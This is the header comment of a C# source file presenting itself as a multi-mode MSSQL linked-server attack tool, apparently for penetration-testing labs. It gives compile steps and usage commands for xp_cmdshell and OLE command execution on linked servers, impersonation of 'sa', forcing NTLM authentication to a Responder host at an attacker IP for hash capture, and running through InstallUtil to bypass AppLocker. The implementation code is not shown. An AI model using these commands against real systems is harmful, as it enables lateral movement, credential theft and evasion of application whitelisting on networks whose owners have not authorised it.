// ================================================================
// sql-v2.cs — Multi-Mode MSSQL Linked Server Attack Tool
// ================================================================
// WHAT THIS DOES:
//   A comprehensive MSSQL lateral movement toolkit. Connects to a SQL
//   Server and supports multiple operation modes controlled by command-
//   line flags. Supports linked server traversal, xp_cmdshell execution,
//   OLE automation execution, NTLM hash forcing, impersonation, and more.
//   Compatible with InstallUtil AppLocker bypass.
//
// MODES (pass one per run):
//   /q   Query mode    — Enumerate MSSQL SPNs in the domain via setspn
//   /e   Enumerate     — Find linked MSSQL instances, check permissions
//   /c   Command       — Run SQL queries on the connected server
//   /f   Enable        — Enable features (xp_cmdshell, OLE) on linked server
//   /x   xp_cmdshell   — Execute OS commands via xp_cmdshell on linked server
//   /o   OLE object    — Execute OS commands via OLE automation on linked server
//   /h   Hash force    — Force SQL Server to auth to your SMB (hash capture)
//
// OPTIONS:
//   /s:<server>        SQL Server hostname or IP (default: localhost)
//   /d:<database>      Database to connect to (default: master)
//   /l:<username>      SQL login username (omit to use Windows auth)
//   /p:<password>      SQL login password
//   /r:<responderIP>   Your Kali IP for /h hash-capture mode
//   /i:<user>          User to impersonate (e.g. sa, dbo)
//   /t                 Tunnel through a linked server to reach its linked servers
//
// NOTE: Use /s=server syntax (equals sign) instead of /s:server
//       when running via InstallUtil (colons break the argument parser).
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
...
//       /out:sql-v2.exe sql-v2.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "sql-v2", Framework: .NET Framework 4.x, click Create
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\sql-v2.exe
//
// ----------------------------------------------------------------
// USAGE EXAMPLES
// ----------------------------------------------------------------
//
//   Enumerate MSSQL SPNs in the domain:
//     sql-v2.exe /q
//
//   Connect and enumerate linked servers + permissions:
//     sql-v2.exe /s:dc01.corp1.com /e
//
//   Connect with SQL creds and enumerate:
//     sql-v2.exe /s:192.168.1.100 /l:sa /p:Password123 /e
//
//   Force NTLM auth to Kali Responder:
//     sql-v2.exe /s:dc01.corp1.com /r:192.168.49.67 /h
//
//   Execute xp_cmdshell on a linked server:
//     sql-v2.exe /s:appsrv01.corp1.com /x
//     (will prompt for the linked server name and command to run)
//
//   Impersonate 'sa' and enable xp_cmdshell:
//     sql-v2.exe /s:dc01.corp1.com /i:sa /f
//
//   Run via InstallUtil (AppLocker bypass) — note equals sign syntax:
//     InstallUtil.exe /logfile= /LogToConsole=false ^
//       /s=dc01.corp1.com /e /U sql-v2.exe
//
// START RESPONDER BEFORE /h mode:
//   sudo responder -I eth0 -v
//
// BEFORE RUNNING, CHANGE:
//   - Pass appropriate /s: /l: /p: /r: arguments at runtime
//   - No hardcoded values need to change in source unless you want defaults
// ================================================================
using System;
